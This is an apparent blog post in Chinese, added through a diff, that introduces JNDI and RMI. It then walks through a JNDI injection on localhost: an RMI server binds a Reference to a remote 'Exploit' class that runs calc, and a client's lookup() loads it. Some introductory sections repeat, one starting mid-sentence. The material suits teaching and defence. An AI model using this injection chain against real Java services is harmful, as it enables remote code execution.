@@ -1,0 +1,252 @@
+<hr>
+<h2 id="title-浅谈JNDI注入date-2023-07-28-17-23-18tags-javatypora-root-url"><a href="#title-浅谈JNDI注入date-2023-07-28-17-23-18tags-javatypora-root-url" class="headerlink" title="title: 浅谈JNDI注入date: 2023-07-28 17:23:18tags: javatypora-root-url: .&#x2F;.."></a>title: 浅谈JNDI注入<br>date: 2023-07-28 17:23:18<br>tags: java<br>typora-root-url: .&#x2F;..</h2><h2 id="1-JNDI"><a href="#1-JNDI" class="headerlink" title="1 JNDI"></a>1 JNDI</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
+<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
+<p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x的注册表、RMI、DSML v1&amp;v2、NIS。</p>
+<p>简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
+<h3 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h3><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
+<pre><code class="java">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；
+
+javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；
+
+javax.naming.event：在命名目录服务器中请求事件通知；
+
+javax.naming.ldap：提供LDAP支持；
+
+javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。
+</code></pre>
+<h2 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2 前置知识"></a>2 前置知识</h2><p><strong>RMI介绍</strong></p>
+<p>　　远程方法调用（RMI）顾名思义是一台机器上的程序调用另一台机器上的方法。这样可以大致知道RMI是用来干什么的，但是这种理解还不太确切。RMI是Java支撑分布式系统的基石，例如著名的EJB组件。RMI是远程过程调用（RPC）的一种面向对象实现，RMI底层是通过socket通信和对象序列化技术来实现的。</p>
+<p><strong>RMI基本原理</strong></p>
+<p>　　RMI的目的就是要使运行在不同的计算机中的对象之间的调用表现得像本地调用一样。RMI 应用程序通常包括两个独立的程序:服务器程序和客户机程序。RMI 需要将行为的定义与行为的实现分别定义, 并允许将行为定义代码与行为实现代码存放并运行在不同的 JVM 上。在 RMI 中, 远程服务的定义是存放在继承了 Remote 的接口中。远程服务的实现代码存放在实现该定义接口的类中。RMI 支持两个类实现一个相同的远程服务接口: 一个类实现行为并运行在服务器上, 而另一个类作为一个远程服务的代理运行在客户机上。客户程序发出关于代理对象的调用方法, RMI 将该调用请求发送到远程 JVM 上, 并且进一步发送到实现的方法中。实现方法将结果发送给代理, 再通过代理将结果返回给调用者。</p>
+<p>通俗的来说，RMI就是能让我们去调用远程服务器上面的对象和方法、即使本地不存在该类。</p>
+<p><strong>RMI应用示例</strong></p>
+<p>代码实现</p>
+<pre><code class="java">public interface Hello extends java.rmi.Remote{
+    public String sayHello(String from) throws java.rmi.RemoteException;
+}
+</code></pre>
+<pre><code class="java">import com.example.log4j2.test.Hello;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class HelloImpl extends UnicastRemoteObject implements Hello {
+    // 构造方法需要声明抛出RemoteException异常
+    public HelloImpl() throws java.rmi.RemoteException {
+        super();
+    }
+
+    // 实现Hello接口的方法
+    @Override
+    public String sayHello(String from) throws RemoteException {
+        // 在服务器端输出一条消息，表示收到客户端的调用请求
+        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);
+
+        // 返回一个字符串作为示例
+        return &quot;sayHello&quot;;
+    }
+}
+</code></pre>
+<p>服务端类</p>
+<pre><code class="java">import com.example.log4j2.test.impl.HelloImpl;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+
+public class HelloServer {
+    public static void main(String[] args) throws RemoteException, NamingException {
+        // 创建RMI注册表，监听在端口1099
+        LocateRegistry.createRegistry(1099);
+
+        // 设置JNDI的属性，指定RMI注册表的地址
+        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+
+        // 创建初始上下文对象
+        InitialContext context = new InitialContext();
+
+        // 将HelloImpl对象绑定到JNDI命名空间中，名字为&quot;hello&quot;
+        // 客户端通过该名字查找到HelloImpl对象并进行远程调用
+        context.bind(&quot;hello&quot;, new HelloImpl());
+
+        // 关闭上下文对象
+        context.close();
+    }
+}
+</code></pre>
+<p>客户端类</p>
+<pre><code class="java">package com.example.log4j2.test.Client;
+
+import com.example.log4j2.test.Hello;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+
+public class HelloClient {
+    public static void main(String[] args) throws NamingException, RemoteException {
+        // 设置RMI注册表的连接信息
+        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+
+        // 创建InitialContext对象，用于查找RMI注册表并获取远程对象引用
+        InitialContext context = new InitialContext();
+
+        // 通过查找RMI注册表，获取远程对象的引用
+        Hello rmiObject = (Hello) context.lookup(&quot;hello&quot;);
+
+        // 调用远程对象的方法，传入参数&quot;world&quot;，并接收返回值
+        String result = rmiObject.sayHello(&quot;world&quot;);
+
+        // 在客户端输出远程对象方法的返回结果
+        System.out.println(result);
+
+        // 关闭InitialContext对象
+        context.close();
+    }
+}
+</code></pre>
+<p>先运行<code>HelloServer</code>，再运行<code>HelloClient</code>，即可看到运行输出的结果：<code>sayHello</code>。</p>
+<p><code>HelloServer</code>将<code>HelloImpl</code>对象绑定到<code>hello</code>名称上。<code>HelloClient</code>使用<code>hello</code>名称，即可获取<code>HelloImpl</code>对象。</p>
+<p>端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
+<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
+<p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x的注册表、RMI、DSML v1&amp;v2、NIS。</p>
+<p>以上是一段百度wiki的描述。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
+<h3 id="JNDI结构-1"><a href="#JNDI结构-1" class="headerlink" title="JNDI结构"></a>JNDI结构</h3><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
+<pre><code class="none">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；
+
+javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；
+
+javax.naming.event：在命名目录服务器中请求事件通知；
+
+javax.naming.ldap：提供LDAP支持；
+
+javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。
+</code></pre>
+<h2 id="2-前置知识-1"><a href="#2-前置知识-1" class="headerlink" title="2 前置知识"></a>2 前置知识</h2><p>其实在面对一些比较新的知识的时候，个人会去记录一些新接触到的东西，例如类的作用。因为在看其他大佬写的文章上有些在一些前置需要的知识里面没有去叙述太多，需要自己去查找。对于刚刚接触到的人来说，还需要去翻阅资料。虽然说在网上都能查到，但是还是会有很多搜索的知识点，需要一个个去进行查找。所以在之类就将一些需要用到的知识点给记录到这里面。方便理解，也方便自己去进行翻看。</p>
+<h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><h4 id="构造方法："><a href="#构造方法：" class="headerlink" title="构造方法："></a>构造方法：</h4><pre><code class="java">InitialContext() 
+构建一个初始上下文。  
+InitialContext(boolean abd) 
+构造一个初始上下文，并选择不初始化它。  
+InitialContext(Hashtable&lt;?,?&gt; environment) 
+使用提供的环境构建初始上下文。 
+</code></pre>
+<p>代码：</p>
+<pre><code class="java">InitialContext initialContext = new InitialContext();
+</code></pre>
+<p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p>
+<h4 id="常用方法："><a href="#常用方法：" class="headerlink" title="常用方法："></a>常用方法：</h4><pre><code class="java">bind(Name name, Object obj) 
+    将名称绑定到对象。 
+list(String name) 
+    枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
+lookup(String name) 
+    检索命名对象。 
+rebind(String name, Object obj) 
+    将名称绑定到对象，覆盖任何现有绑定。 
+unbind(String name) 
+    取消绑定命名对象。 
+</code></pre>
+<p>代码：</p>
+<pre><code class="java">import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class jndi {
+    public static void main(String[] args) throws NamingException {
+        String uri = &quot;rmi://127.0.0.1:1099/exp&quot;;
+        InitialContext initialContext = new InitialContext();
+        initialContext.lookup(uri);
+    }
+}
+</code></pre>
+<h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
+<h4 id="构造方法：-1"><a href="#构造方法：-1" class="headerlink" title="构造方法："></a>构造方法：</h4><pre><code class="java">Reference(String className) 
+    为类名为“className”的对象构造一个新的引用。  
+Reference(String className, RefAddr addr) 
+    为类名为“className”的对象和地址构造一个新引用。  
+Reference(String className, RefAddr addr, String factory, String factoryLocation) 
+    为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  
+Reference(String className, String factory, String factoryLocation) 
+    为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  
+</code></pre>
+<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>
+<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>
+<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>
+<h2 id="3-JNDI注入攻击"><a href="#3-JNDI注入攻击" class="headerlink" title="3 JNDI注入攻击"></a>3 JNDI注入攻击</h2><p>在叙述JNDI注入前先来看一段源码。</p>
+<h4 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h4><pre><code class="java">package com.rmi.demo;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class jndi {
+    public static void main(String[] args) throws NamingException {
+        String uri = &quot;rmi://127.0.0.1:1099/exploit&quot;;
+        InitialContext initialContext = new InitialContext();//得到初始目录环境的一个引用
+        initialContext.lookup(uri);//获取指定的远程对象
+
+    }
+}
+</code></pre>
+<p>在上面的<code>InitialContext.lookup(uri)</code>的这里，如果说URI可控，那么客户端就可能会被攻击。JNDI可以使用RMI、LDAP来访问目标服务。在实际运用中也会使用到JNDI注入配合RMI等方式实现攻击。</p>
+<h3 id="JNDI注入-RMI实现攻击"><a href="#JNDI注入-RMI实现攻击" class="headerlink" title="JNDI注入+RMI实现攻击"></a>JNDI注入+RMI实现攻击</h3><p>下面还是来看几段代码，来做一个分析具体的攻击流程。</p>
+<h4 id="RMIServer代码："><a href="#RMIServer代码：" class="headerlink" title="RMIServer代码："></a>RMIServer代码：</h4><pre><code class="java">package com.example.log4j2.JNDIRMI;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import java.rmi.AlreadyBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIserver {
+    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
+        // 设置一个虚假的URL，实际上并不会被使用它只是作为一个占位符存在，用于创建Reference对象。
+        String url = &quot;http://127.0.0.1:8088/&quot;;
+        // 创建RMI注册表，并监听在默认端口号1099
+        Registry registry = LocateRegistry.createRegistry(1099);
+        // 创建一个Reference对象，用于存储远程对象的引用信息
+        Reference reference = new Reference(&quot;Exploit&quot;, &quot;Exploit&quot;, url);
+        // 创建一个ReferenceWrapper对象，将Reference对象封装成Wrapper对象
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+        // 将ReferenceWrapper对象绑定到RMI注册表中，使用名字&quot;exp&quot;
+        registry.bind(&quot;exp&quot;, referenceWrapper);
+        // 输出提示信息
+        System.out.println(&quot;running&quot;);
+    }
+}
+</code></pre>
+<h4 id="RMIClient代码："><a href="#RMIClient代码：" class="headerlink" title="RMIClient代码："></a>RMIClient代码：</h4><pre><code class="java">package com.example.log4j2.JNDIRMI;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class RMIClient {
+    public static void main(String[] args) throws NamingException {
+        String url = &quot;rmi://localhost:1099/exp&quot;;
+        // 创建一个初始上下文对象
+        InitialContext initialContext = new InitialContext();
+        // 通过RMI URL &quot;rmi://localhost:1099/exp&quot; 在RMI注册表中查找对应的远程对象
+        initialContext.lookup(url);
+    }
+}
+</code></pre>
+<p>恶意类，挂载在web页面上让server端去请求。</p>
+<pre><code class="java">package com.example.log4j2.JNDIRMI;
+import java.io.IOException;
+
+public class Exploit {
+    public static void main(String[] args) throws IOException {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+}
+</code></pre>
+<p>使用javac命令，将该类编译成class文件挂载在web页面上。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20230726143732215.png" alt="image-20230726143732215"></p>
+<p>先运行RMIServer把恶意类绑定在RMI的Registry 里面，然后在运行RMIClient，在客户端调用<code>lookup</code>远程获取远程类的时候就会去寻找我们在RMI里面绑定的恶意类，请求到远程的类后会在本地进行执行。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20230726145458695.png" alt="image-20230726145458695"></p>
+<p>我在这里其实是执行失败了，因为在高版本中，系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为false。而在低版本中这几个选项默认为true，可以远程加载一些类。</p>
